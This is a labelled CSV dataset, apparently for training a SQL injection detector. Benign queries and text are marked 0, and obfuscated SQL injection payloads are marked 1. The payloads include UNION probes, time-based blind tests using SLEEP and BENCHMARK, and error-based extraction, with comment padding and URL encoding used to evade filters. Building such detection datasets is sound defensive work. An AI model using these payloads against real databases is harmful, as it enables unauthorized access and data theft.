Query,Label
SELECT leaf ( s ) FROM medicine INNER JOIN,0
"1/**/|| 8421	=  ( 	select	count(	*	 ) fromgenerate_series( 1,5000000	 	)	  )  --xgyc",1
"sElect * from users Where id  =  1 UnIoN sElect 1 1a,versIon  (    )   -- 1",1
1%22%0Bwhere%091719%0C%09%3D%09%091719%09and%C2%A07533%0B%0C%3D%0B%C2%A07533--,1
SELECT earth ( s FROM national RIGHT JOIN,0
"1'	) asjuxt where5956	=  5956&& 8148 =	like 	(	 'abcdefg',upper ( hex(randomblob 	(500000000/2	)		 )		 	) 		)	 --",1
1   )    ),1
eansor,0
d76en3r9n8z01,0
"carretera estacion, 144, 8-d",0
iif%20%20%28%20%209134%20%20%3D%20%205736%2C1%2C1/0%20%20%29,1
-2384%27%7C%7C%20%20%28%20%20SElEct%20%27vhcp%27%20from%20dual%20WHERe%201266%20%20%3D%20%201266%20UNiOn%20ALL%20SElEct%201266%2C1266%2C1266%2C1266--,1
capella gorrn,0
castellanos de zapardiel,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20hace%20where%208785%20LIKE%208785,1
"1/**//**/)/**//**//**/Or/**/cHAr/**//**/(/**//**/119/**//**/)/**//**/||cHAr/**//**/(/**//**/100/**//**/)/**//**/||cHAr/**//**/(/**//**/99/**//**/)/**//**/||cHAr/**//**/(/**//**/121/**//**/)/**//**//**//**/=/**//**/regexp_substring/**//**/(/**//**/repeat/**//**/(/**//**/RIGht/**//**/(/**//**/cHAr/**//**/(/**//**/1441/**//**/)/**//**/,0/**//**/)/**//**/,5000000000/**//**/)/**//**/,NulL/**//**/)/**//**/--",1
7stambrar,0
"1""/**/||/**/7552/**//**/=/**//**//**//**/(/**//**/select/**/count/**//**/(/**//**/*/**//**/)/**//**//**/from/**/rdb$fields/**/as/**/t1,rdb$types/**/as/**/t2,rdb$collations/**/as/**/t3,rdb$functions/**/as/**/t4/**//**/)/**//**//**/&&/**/""zcfa""/**//**/=/**//**/""zcfa",1
1'||	(	select	'vvpn'from dualwhere7011LIKE7011 && 7756	LIKEdbms_utility.sqlid_to_sqlhash ( 	( 	chr	(  113	 )	||chr	( 	113	) ||chr (112 ) ||chr 	( 106		)	||chr	 (113 )	 ||(	select	(case when	(		7756LIKE7756 ) 	then1else0end ) from	dual )	||chr		(	113)	||chr ( 	122	 )||chr	(118 )	 ||chr	(122 ) 	||chr	(113 ) )) ) ||',1
ag-uzadura,0
1%'  )   && 4595  =  4595#,1
SELECT * FROM thrown FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM company,0
iif%20%20%28%20%207953%20%20%3D%20%203021%2C1%2C1/0%20%20%29,1
"selectcount( *	)		 fromgenerate_series	(1,5000000	)	 and	 (  'tnvm' like 'tnvm",1
"-9854/**//**/)/**//**//**//*!or*//**/5023/**//**//*!LIKE*//**//**/ctxsys.drithsx.sn/**//**/(/**//**/5023,/**//**/(/**//**/chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/112/**//**/)/**//**/||chr/**//**/(/**//**/106/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||/**//**/(/**//**//*!select*//**//**//**/(/**//**//*!case*//**//*!when*//**//**//**/(/**//**/5023/**//**//*!LIKE*//**//**/5023/**//**/)/**//**//**//*!then*//**/1/**//*!else*//**/0/**//*!end*//**//**/)/**//**//**//*!from*//**/dual/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/118/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**//*!and*//**//**//**/(/**//**/5696/**//**//*!LIKE*//**//**/5696",1
DELETE FROM seems WHERE cream = 'production',0
"c/ cels gomis i mestre 171,",0
1%27%2B%20%20%28%20%20select%20wpbj%20where%201849%20%20%3D%20%201849,1
"paseo pinos, 147",0
-3971%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%20elt%20%20%28%20%201032%20%20%3D%20%201032%2C3623%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
SELECT TOP 3 * FROM each SELECT * FROM oil 3SELECT * FROM behind,0
SELECT part ( s )  FROM cannot LEFT JOIN,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   && '%' LIKE '",1
-4477%27%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%208444%2C8444%2C8444%2C8444%2C8444%2C8444%2C8444%2C8444--,1
1%20where%202031%20%20%3D%20%202031%20or%205356%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%29%20%20--,1
SELECT COUNT ( box ) FROM balance,0
SELECT * FROM electricity FETCH FIRST 3 ROWS ONLY,0
1/*!&&*/3715/*!In*/   (    (  /*!cHaR*/ (  113  )  +/*!cHaR*/ (  113  )  +/*!cHaR*/ (  112  )  +/*!cHaR*/ (  106  )  +/*!cHaR*/ (  113  )  +  ( /*!SelecT*/  ( /*!CaSE*//*!WhEn*/  (  3715  =  3715  )  /*!TheN*//*!cHaR*/ (  49  )  /*!ElsE*//*!cHaR*/ (  48  )  /*!ENd*/  )    )   +/*!cHaR*/ (  113  )  +/*!cHaR*/ (  122  )  +/*!cHaR*/ (  118  )  +/*!cHaR*/ (  122  )  +/*!cHaR*/ (  113   )    )     ),1
1%'/**/rlike/**//**//**/(/**//**//*!select*//**//**//**/(/**//**//*!case*//**//*!when*//**//**//**/(/**//**/3596/**//**/=/**//**/4245/**//**/)/**//**//**//*!then*//**/1/**//*!else*//**/0x28/**//*!end*//**//**//**/)/**//**//**//**/)/**//**//**//**/&&/**/'%'/**//**/=/**//**/',1
SELECT * FROM essential FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM horse,0
"-3873%'		)	)		 	Or1 grOUP byconcat	( 0x7171706a71, 	(  SEleCt	 (cAseWHEN		(	4232 	=	4232	)		thEN1eLsE0EnD			)    ) ,0x717a767a71,floor(		rand(0	)	*2			)		)	 	hAvinGmin(		0		) #",1
"SELECT low,bound,develop,kill,older     (  (  string JOIN beyond ON youth.speed =  studying.bend )   INNER JOIN masterON Orders.feel =  greatly.trackID )",0
"1'  )   aS uqkz wHeRE 8482 liKe 8482 && 8407 liKe (  sElECt count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT TOP 50 PERCENT * FROM went SELECT * FROM that FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ear,0
end%20and%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
"-6987'/**//*!union*//**//*!all*//**//*!select*//**/4721,4721--",1
equilibrio,0
cagarria,0
-3677%27%20%20%20%29%20%20%20%20%29%20%20%20%20Or%201939%20lIke%204484,1
SELECT * FROM clothing WHERE laugh BETWEEN '1996-07-01' AND '1996-07-31',0
"1'||  (  select 'mzhj' where 9677 LIKE 9677 union all select null,null,null--",1
milton,0
SELECT secret ( s FROM must RIGHT JOIN,0
-4583'/**//**/)/**//**//*!as*/evbo/*!where*/6055/**/LIKE/**/6055/*!union*//*!all*//*!select*/6055--,1
45810,0
SELECT Count ( * )  AS women,0
select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20and%20%20%20%28%20%20%22snwx%22%20like%20%22snwx,1
SELECT Count ( * )  AS route,0
SELECT fought ( s )  FROM planned,0
-5996%20%20%29%20%20/%2A%21or%2A/5023%20%20%3D%20%20ctxsys.drithsx.sn%20%20%28%20%205023%2C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20/%2A%21select%2A/%20%20%28%20/%2A%21case%2A//%2A%21when%2A/%20%20%28%20%205023%20%20%3D%20%205023%20%20%29%20%20/%2A%21then%2A/1/%2A%21else%2A/0/%2A%21end%2A/%20%29%20%20/%2A%21from%2A/dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29,1
"1%'/**/ )		 ) 		andmake_set (6527	=	9529,9529	)	  and(	  	(	'%'	='",1
"SELECT lack, no, previousFROM twenty WHERE nails  IS NOT NULL",0
lavada,0
1%20%20%20%29%20%20%20%20%29%20%20%20%20as%20nxdf%20where%201696%20%20%3D%20%201696%20or%208514%20%20%3D%20%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x544d5a4c%20%20%20%29%20%20%20%20%29%20%20%20%23,1
arimany aguila,0
SELECT * FROM nervous WHERE burn  BETWEEN 10 AND 20,0
SELECT AVG ( consist ) FROM getting SELECT SUM ( pen ),0
"SELECT bagID AS ID, rush AS young FROM material",0
SELECT * FROM spread FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM himself,0
"SELECT * FROM rather WHERE anything IN  ( 'doctor', 'examine', 'well' )",0
/%2A%2A/or/%2A%2A/1/%2A%2A/%20LIKE%20/%2A%2A/1,1
"calle prat de la riba, 73",0
SELECT AVG ( neck ) FROM leader,0
"1'|| 	( SeLEct	'jzwq'wHerE3289=	3289UnIon ALL	SeLEctnUll,nUll,nUll,nUll,nUll,nUll,nUll#",1
SELECT COUNT ( darknessID ) FROM nodded,0
SELECT * FROM bare WHERE tomorrow BETWEEN bent09/01/1996improve AND clock15/31/1996musical,0
if/**//**/(/**//**/8995/**//**/=/**//**/9787/**//**/)/**//**//*!select*/8995/*!else*//*!drop*/function/**/ofgg--,1
1/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/and/%2A%2A/6055/%2A%2A//%2A%2A/%20LIKE%20/%2A%2A//%2A%2A/ctxsys.drithsx.sn/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/6055%2C/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/chr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/112/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/106/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7C/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/select/%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/case/%2A%2A/when/%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/6055/%2A%2A//%2A%2A/%20LIKE%20/%2A%2A//%2A%2A/6055/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/then/%2A%2A/1/%2A%2A/else/%2A%2A/0/%2A%2A/end/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/from/%2A%2A/dual/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/122/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/118/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/122/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29,1
select%20%2A/%2A%21from%2A/users/%2A%21where%2A/id%20%20%3D%20%201%20%3C%40.%24/%2A%21or%2A/1%20%20%3D%20%201%20--%201,1
SELECT TOP 3 * FROM between,0
"SELECT Orders.sayrID, Employees.rose, Employees.steep FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.foxID ORDER BY Orders.climateID",0
hoog,0
geffner-schoo@bacoespecialseleccin.bm,0
"SELECT giant AS rhyme, copper AS [particular]  FROM loose",0
SELECT * FROM log WHERE primitive  BETWEEN 10 AND 20,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%206240%20%20%3D%20%20%20%20%28%20%20%27qqpjq%27%7C%7C%20%20%28%20%20select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%20%20%29%20%20%7C%7C%27qzvzq%27%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22buwe%22%20%20%3D%20%20%22buwe,1
SELECT memory ( s )  FROM powerful SELECT lying FROM money,0
SELECT COUNT ( DISTINCT serve )  FROM completely,0
"SELECT column_name ( s )  FROM itself,atom",0
"1""/**//**/)/**//**//**//*!OR*//**//*!SLEEP*//**//**/(/**//**/5/**//**/)/**//**//**//*!aND*//**//**//**/(/**//**/""xgtk""/**//**/=/**//**/""xgtk",1
8.42194E+15,0
1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20/%2A%21and%2A/8990%20%20%3D%20%204775/%2A%21and%2A/%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%201894%20%20%3D%20%201894,1
-3767%27/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/as/%2A%2A/eefl/%2A%2A/where/%2A%2A/8260/%2A%2A//%2A%2A/%20LIKE%20/%2A%2A//%2A%2A/8260/%2A%2A/union/%2A%2A/all/%2A%2A/select/%2A%2A/8260%2C8260%2C8260%2C8260%2C8260%2C8260%2C8260%23,1
ruesga,0
palls de buran,0
50344,0
"-8707'/**//**/)/**//**//**/union/**/all/**/select/**/5609,5609,5609--",1
1/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/as/%2A%2A/fqee/%2A%2A/where/%2A%2A/3286/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/3286,1
gaspard-birgel@indorec.kr,0
"1'/**//*!In*//**/boolean/**/mode/**//**/)/**//**//**//*!unioN*//**//*!aLL*//**//*!sELECt*//**//*!NUlL*/,/*!NUlL*/,/*!NUlL*/,/*!NUlL*/,/*!NUlL*/,/*!NUlL*/,/*!NUlL*/,/*!NUlL*/--",1
"SELECT longer, rocky, sweet FROM metal WHERE someone  IS NULL",0
7395,0
1%25%27%20%20%29%20%20%20ANd%20extractvalue%20%20%28%20%207982%2Cconcat%20%20%28%20%200x5c%2C0x7171706a71%2C%20%20%28%20%20SelECt%20%20%20%28%20%20elt%20%20%28%20%207982%20%20%3D%20%207982%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%20%29%20%20%20%20%29%20%20%20%20ANd%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
"SeLECt */*!fROm*/users/*!WhEre*/id  =  1 <@./*!UNION*//*!SeLECt*/1,/*!VErSiON*/ (    )   -- 1",1
"select/**/*/*!from*/generate_series/**//**/(/**//**/8147,8147,/*!case*//*!when*//**//**/(/**//**/8147/**//**/=/**//**/6336/**//**/)/**//**//*!then*/1/*!else*/0/*!end*//**/)/**//**//*!limit*/1--",1
SELECT * FROM twelve WHERE example = 'use'  AND City = 'unless',0
17130,0
SELECT * FROM deeply WHERE negative NOT BETWEEN 'usual' AND 'plastic',0
1%27/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/as/%2A%2A/ezoa/%2A%2A/where/%2A%2A/4915/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/4915/%2A%2A/and/%2A%2A/9660/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/select/%2A%2A/count/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/%2A/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/from/%2A%2A/all_users/%2A%2A/t1%2Call_users/%2A%2A/t2%2Call_users/%2A%2A/t3%2Call_users/%2A%2A/t4%2Call_users/%2A%2A/t5/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/--,1
SELECT * FROM cause WHERE atomic = 'plural',0
1%27%20%20%29%20%20%20where%201424%20%20%3D%20%201424%20and%20sleep%20%20%28%20%205%20%20%29%20%20--,1
-5204%22%20%20%29%20%20%20union%20all%20select%207186%2C7186%2C7186--,1
"-7635""/**/union/**/all/**/select/**/1284,1284,1284,1284,1284,1284#",1
"-7802'/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/oR/**/elt/**//**/(/**//**/8778/**//**/=/**//**/9974,9974/**//**/)/**//**//**/AnD/**//**//**//**/(/**//**//**//**/(/**//**//**//**//**/(/**//**/'glsq'/**/liKE/**/'glsq",1
"1""/**//**//**/)/**//**//**//**/)/**//**//**//**/as/**/jikg/**/WhERE/**/8258/**//**/=/**//**/8258/**/&&/**//**//**/(/**//**/3973/**//**/=/**//**/1047/**//**/)/**//**/*1047--",1
"1'+  ( /*!select*/'arqt'/*!where*/2336  =  2336/*!||*//*!char*/ (  75  )  ||/*!char*/ (  70  )  ||/*!char*/ (  99  )  ||/*!char*/ (  83  )    =  regexp_substring  (  repeat  ( /*!left*/ (  crypt_key  ( /*!char*/ (  65  )  ||/*!char*/ (  69  )  ||/*!char*/ (  83  )  ,/*!null*/ )  ,0  )  ,500000000  )  ,/*!null*/ )  --",1
SELECT * FROM win ORDER BY advice,0
DELETE FROM satellites,0
"SELECT MAKEDATE ( 2017, 366 ) ;",0
SELECT AVG ( begun ) FROM band SELECT SUM ( chosen ),0
levert,0
"diamante, 114,",0
cracoviano,0
SELECT * FROM notice FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cross,0
SELECT * FROM  ( SELECT instance FROM coach ),0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND t.term_id IN  (  2637  )",0
SELECT * FROM nose WHERE zero = 'slope'  AND City = 'muscle',0
DELETE FROM forty WHERE till = 'come',0
1%25%27%20or%204915%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20%20%29%20%20--,1
1%27%2B%20%20%28%20/%2A%21select%2A/%27sacd%27/%2A%21where%2A/5984%20%20%3D%20%205984/%2A%21union%2A//%2A%21all%2A//%2A%21select%2A//%2A%21null%2A/%2C/%2A%21null%2A/%2C/%2A%21null%2A/%2C/%2A%21null%2A/%2C/%2A%21null%2A/%2C/%2A%21null%2A/%2C/%2A%21null%2A/%23,1
"1'+/**//**/(/**//**/seLEct/**/'eoxk'/**/WhERe/**/6621/**//**/=/**//**/6621/**/unIoN/**/alL/**/seLEct/**/NUlL,NUlL#",1
"1'/**//**/)/**//**//**/where/**/7093/**//**/=/**//**/7093/**/&&/**/8148/**//**/=/**//**/like/**//**/(/**//**/'abcdefg',upper/**//**/(/**//**/hex/**//**/(/**//**/randomblob/**//**/(/**//**/500000000/2/**//**//**/)/**//**//**//**/)/**//**//**//**//**//**/)/**//**//**//**/)/**//**//**/--",1
"1'/**//**/)/**//**//**/or/**/CHar/**//**/(/**//**/117/**//**/)/**//**/||CHar/**//**/(/**//**/111/**//**/)/**//**/||CHar/**//**/(/**//**/105/**//**/)/**//**/||CHar/**//**/(/**//**/100/**//**/)/**//**//**//**/=/**//**/regexp_substring/**//**/(/**//**/repeat/**//**/(/**//**/lEfT/**//**/(/**//**/crypt_key/**//**/(/**//**/CHar/**//**/(/**//**/65/**//**/)/**//**/||CHar/**//**/(/**//**/69/**//**/)/**//**/||CHar/**//**/(/**//**/83/**//**/)/**//**/,nuLL/**//**/)/**//**/,0/**//**/)/**//**/,500000000/**//**/)/**//**/,nuLL/**//**/)/**//**//**/and/**//**//**/(/**//**/'ozef'/**//**/=/**//**/'ozef",1
"SELECT circleID AS ID, stove AS headed FROM thing",0
SELECT * FROM slip FETCH FIRST 50 PERCENT ROWS ONLY,0
"1"" /*!where*/1452=  1452/*!union*//*!all*/	/*!select*//*!null*/,/*!null*/,/*!null*/,/*!null*/--",1
SELECT * FROM coal WHERE foot = 'above' FETCH FIRST 3 ROWS ONLY,0
select%20count%20%20%28%20%20%2A%20%20%29%20%20/%2A%21from%2A/rdb%24fields/%2A%21as%2A/t1%2Crdb%24types/%2A%21as%2A/t2%2Crdb%24collations/%2A%21as%2A/t3%2Crdb%24functions/%2A%21as%2A/t4/%2A%21and%2A/%27bnfu%27/%2A%21like%2A/%27bnfu,1
"1%""  )   || SLeeP  (  5  )   &&   (  ""%""  =  """,1
SELECT * FROM thus 3,0
SELECT * FROM  ( SELECT mind FROM between ),0
48289,0
takakura@cenitsoria.sb,0
SELECT * FROM consonant WHERE regular LIKE '%now%',0
"paso de la soledad, 130 10?f",0
shedd,0
48042322z,0
SELECT * FROM rope WHERE Price NOT BETWEEN 10 AND 20,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 193 )  ORDER BY meta_id ASC",0
-7812%27%20%20%29%20%20%20or%205023%20%20%3D%20%20ctxsys.drithsx.sn%20%20%28%20%205023%2C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%205023%20%20%3D%20%205023%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%28%20%20%27ttvo%27%20%20%3D%20%20%27ttvo,1
shirleen,0
SELECT AVG ( out ) FROM colony,0
vildo@prensahp.fj,0
SELECT roof ( s ) FROM diameter INNER JOIN,0
SELECT stick ( s ) FROM gentle INNER JOIN,0
SELECT * FROM grain WHERE positive = 'matter'  OR remember = 'warm',0
1'||  (  SElecT 'bqhi' FrOm dual whERE 7409 LIKE 7409,1
"INSERT INTO respect  ( say, officer, on )  VALUES  ( 'ruler', 'party', 'gradually' )",0
"SELECT personalID AS ID, tape AS couple FROM happy",0
SELECT AVG ( molecular )  FROM week  SELECT SUM ( everywhere ),0
SELECT * FROM fun WHERE    NOT travel = 'pair',0
